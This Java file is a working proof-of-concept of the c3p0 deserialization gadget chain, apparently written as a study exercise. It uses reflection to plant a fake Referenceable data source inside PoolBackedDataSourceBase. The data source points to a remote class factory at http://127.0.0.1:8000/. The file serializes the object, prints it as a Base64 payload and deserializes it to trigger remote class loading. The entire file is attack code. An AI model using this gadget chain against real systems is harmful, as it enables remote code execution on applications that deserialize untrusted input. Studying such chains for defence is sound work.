import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Base64;
import java.util.logging.Logger;

public class URLClassLoaderTest {
    private static class ConnectionPool implements ConnectionPoolDataSource , Referenceable{
        protected String classFactory = null;
        protected String classFactoryLocation = null;
        public ConnectionPool(String classFactory,String classFactoryLocation){
            this.classFactory = classFactory;
            this.classFactoryLocation = classFactoryLocation;
        }
        @Override
        public Reference getReference() throws NamingException {return new Reference("ref",classFactory,classFactoryLocation);}
        @Override
        public PooledConnection getPooledConnection() throws SQLException {return null;}
        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {return null;}
        @Override
        public PrintWriter getLogWriter() throws SQLException {return null;}
        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {}
        @Override
        public void setLoginTimeout(int seconds) throws SQLException {}
        @Override
        public int getLoginTimeout() throws SQLException {return 0;}
        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {return null;}
    }
    public static void main(String[] args) throws Exception{

        Constructor constructor = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase").getDeclaredConstructor();
        constructor.setAccessible(true);
        PoolBackedDataSourceBase obj = (PoolBackedDataSourceBase) constructor.newInstance();

        ConnectionPool connectionPool = new ConnectionPool("Main","http://127.0.0.1:8000/");
        Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(obj, connectionPool);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
